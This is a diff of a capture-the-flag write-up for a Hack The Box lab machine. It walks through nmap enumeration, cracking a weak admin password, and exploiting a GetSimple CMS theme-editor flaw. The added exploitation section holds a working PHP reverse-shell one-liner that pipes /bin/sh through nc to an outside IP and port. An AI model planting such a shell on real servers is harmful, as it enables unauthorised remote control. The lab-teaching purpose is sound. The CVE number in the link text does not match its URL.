@@ -14,11 +14,16 @@
 *Getting Started* is an Easy Level system and is meant to be the first *blackbox* machine someone following the *Penetration Tester* Learning path would encounter. As such I was not able to obtain creator information, a direct link to the machine, or it's info card. Although I can register a guess who the creator was based on a username found on the system.
 In this challenge I gain a foothold by exploiting [CVE-2019-11321](https://nvd.nist.gov/vuln/detail/CVE-2019-11231). From there I'm able to obtain root access using the *www-data* users sudo privileges over the *php* command that can be found on [GTFO Bins](https://gtfobins.github.io/gtfobins/php/#sudo).
 
+---
+
+<ins> **Enumeration** </ins>
+
 I Normally start each machine with an *nmap* scan and this one was no exception. 
 
 ![nmap output](/docs/assets/images/HTB/gettingstarted/gettingstarted1.png)
 
-Port 22/tcp open to ssh using OpenSSH 8.2p1 
+Port 22/tcp open to ssh using OpenSSH 8.2p1
+ 
 Port 80/tcp open to http using Apache httpd 2.4.41
 
 Neither one yielded any results initially with *searchsploit*. Navigating over to the webpages showed me what looked like an outline for a blog or something running *GetSimple* Content Managment System. This page contains a few links to documentation for *GetSimple* and some support forums. There are also some headers containing some content in a language I can't read, a list of features, and finally a link to *gettinstarted*. 
@@ -72,3 +77,30 @@ sudo john passhash.txt
 ![john](/docs/assets/images/HTB/gettingstarted/gettingstarted15.png)
 
 The password is *admin*. Navigating back over to the */admin* directory I enter the credentials *admin:admin* and gain access to the CMS admin page.
+
+![CMS admin page](/docs/assets/images/HTB/gettingstarted/gettingstarted16.png)
+
+---
+
+
+<ins> **Exploitation** </ins>
+
+According to the CVE I found the *theme-edit.php* file has poor input sanitization and allows for the upload of arbitrary content like php code. So I'm just going to replace everything currently in the editor with a php reverse shell.  
+
+`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.152 3232 >/tmp/f"); ?>`
+
+
+
+![Theme Editor](/docs/assets/images/HTB/gettingstarted/gettingstarted17.png)
+
+![php rev shell](/docs/assets/images/HTB/gettingstarted/gettingstarted18.png)
+
+After that I will set up a listener in a new terminal then navigate over to the file path, *http://gettingstarted.htb/theme/innovation/* as specified on the *Content Theme* page, and click the file now containing the payload to execute it.
+
+![listener](/docs/assets/images/HTB/gettingstarted/gettingstarted19.png)
+
+![filepath](/docs/assets/images/HTB/gettingstarted/gettingstarted20.png)
+
+![execute shell](/docs/assets/images/HTB/gettingstarted/gettingstarted21.png)
+
+
